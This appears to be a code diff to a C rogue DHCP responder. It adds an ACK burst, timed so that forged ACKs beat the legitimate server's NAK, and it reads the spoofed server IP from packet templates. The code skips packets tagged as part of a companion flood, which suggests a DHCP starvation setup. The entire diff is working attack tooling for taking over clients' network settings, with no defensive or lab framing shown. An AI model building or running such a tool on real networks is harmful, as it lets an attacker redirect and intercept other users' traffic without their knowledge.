@@ -9,6 +9,12 @@
  *   - Only mutates the fields that change per transaction:
  *       Ethernet dst/src, BOOTP xid, BOOTP chaddr, UDP checksum (zeroed).
  *
+ *   - FIX B: server identity is no longer a #define.  It is read from
+ *            offer.bin's IPv4 source address, so the C side can never
+ *            desync from the Python templates.
+ *   - FIX C: every DHCPREQUEST that selects us is answered with a burst
+ *            of ACKs so the legitimate server's NAK always loses the race.
+ *
  * Build:
  *     gcc -O2 -Wall -Wextra -o dhcp_responder dhcp_responder.c
  *
@@ -31,6 +37,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <time.h>                 /* FIX C: nanosleep */
 #include <unistd.h>
 
 /* ---------------- configuration ---------------- */
@@ -39,8 +46,14 @@
 #define OFFER_FILE     "offer.bin"
 #define ACK_FILE       "ack.bin"
 
-#define SERVER_IP_STR  "192.168.1.200"
 #define FLOOD_TAG      "FLOOD-NOISE"
+
+/* FIX C: ACK burst parameters.
+ * Legit-server NAK was observed ~90-100 ms after REQUEST (see pcap).
+ * 3 ACKs spanning 0/30/60 ms means the client has bound our lease long
+ * before any NAK can arrive. */
+#define ACK_BURST         3
+#define ACK_BURST_GAP_MS 30
 
 /* ---------------- template frame offsets ---------------- */
 /*
@@ -63,6 +76,9 @@
 #define ETH_DST_OFF        0
 #define ETH_SRC_OFF        6
 #define ETH_TYPE_OFF      12
+
+#define IP_HDR_OFF        14
+#define IP_SRC_OFF        (IP_HDR_OFF + 12)   /* FIX B: template's server IP */
 
 #define UDP_CHKSUM_OFF    40
 
@@ -215,7 +231,6 @@ static void handle_packet(const unsigned char *pkt, size_t len)
     uint16_t dport = (uint16_t)((pkt[udp + 2] << 8) | pkt[udp + 3]);
     if (sport != 68 || dport != 67) return;   /* only client -> server */
 
-
     /* --- BOOTP --- */
     size_t bootp = udp + 8;
     if (pkt[bootp] != 1) return;              /* must be a request */
@@ -228,7 +243,6 @@ static void handle_packet(const unsigned char *pkt, size_t len)
 
     const unsigned char *chaddr     = pkt + bootp + 28;  /* 16 bytes */
     const unsigned char *client_mac = pkt + ETH_SRC_OFF; /* 6 bytes  */
-   
 
     /* --- DHCP options --- */
     size_t opt = bootp + BOOTP_FIXED_LEN;
@@ -237,8 +251,6 @@ static void handle_packet(const unsigned char *pkt, size_t len)
     if (memcmp(pkt + opt, "\x63\x82\x53\x63", DHCP_COOKIE_LEN) != 0)
         return;
     opt += DHCP_COOKIE_LEN;
-
-
 
     int msg_type  = 0;
     int is_flood  = 0;
@@ -269,10 +281,6 @@ static void handle_packet(const unsigned char *pkt, size_t len)
         i += olen;
     }
 
-
-    printf("BOOTP packet\n");
-    printf("%d\n", msg_type);
-
     if (is_flood) return;
 
     char mac[18];
@@ -289,8 +297,22 @@ static void handle_packet(const unsigned char *pkt, size_t len)
             printf("[-] Request from %s for other server, ignoring\n", mac);
             return;
         }
-        printf("[*] DHCP Request  from %s  xid=0x%08x\n", mac, xid);
-        send_dhcp(g_ack, g_ack_len, client_mac, xid, chaddr, "Ack");
+        printf("[*] DHCP Request  from %s  xid=0x%08x  "
+               "(burst x%d, %d ms apart)\n",
+               mac, xid, ACK_BURST, ACK_BURST_GAP_MS);
+
+        /* FIX C: burst the ACK so the legitimate server's NAK
+         * never wins the race. */
+        for (int k = 0; k < ACK_BURST; k++) {
+            send_dhcp(g_ack, g_ack_len, client_mac, xid, chaddr, "Ack");
+            if (k + 1 < ACK_BURST) {
+                struct timespec ts = {
+                    .tv_sec  = 0,
+                    .tv_nsec = ACK_BURST_GAP_MS * 1000L * 1000L
+                };
+                nanosleep(&ts, NULL);
+            }
+        }
     }
 }
 
@@ -306,6 +328,24 @@ int main(void)
 
     printf("[*] %s: %zu B   %s: %zu B\n",
            OFFER_FILE, g_offer_len, ACK_FILE, g_ack_len);
+
+    /* FIX B: derive the server identity from the templates themselves,
+     * so C can never desync from prepare_packets.py. -------------------- */
+    if (g_offer_len < IP_SRC_OFF + 4 || g_ack_len < IP_SRC_OFF + 4) {
+        fprintf(stderr, "template too small to contain an IPv4 header\n");
+        return 1;
+    }
+    memcpy(g_server_ip, g_offer + IP_SRC_OFF, 4);   /* IP src of OFFER */
+
+    /* sanity: both templates must advertise the same server */
+    if (memcmp(g_server_ip, g_ack + IP_SRC_OFF, 4) != 0) {
+        fprintf(stderr, "warning: offer.bin and ack.bin advertise "
+                        "different server IPs\n");
+    }
+
+    char sip[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, g_server_ip, sip, sizeof(sip));
+    printf("[*] Advertised server IP (from %s): %s\n", OFFER_FILE, sip);
 
     /* Interface MAC --------------------------------------------------- */
     if (get_iface_mac(INTERFACE, g_iface_mac) < 0) {
@@ -323,14 +363,6 @@ int main(void)
                 INTERFACE, strerror(errno));
         return 1;
     }
-
-    /* Server IP as bytes --------------------------------------------- */
-    struct in_addr sa;
-    if (inet_pton(AF_INET, SERVER_IP_STR, &sa) != 1) {
-        fprintf(stderr, "bad SERVER_IP_STR\n");
-        return 1;
-    }
-    memcpy(g_server_ip, &sa.s_addr, 4);
 
     /* RX socket ------------------------------------------------------- */
     int rx_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
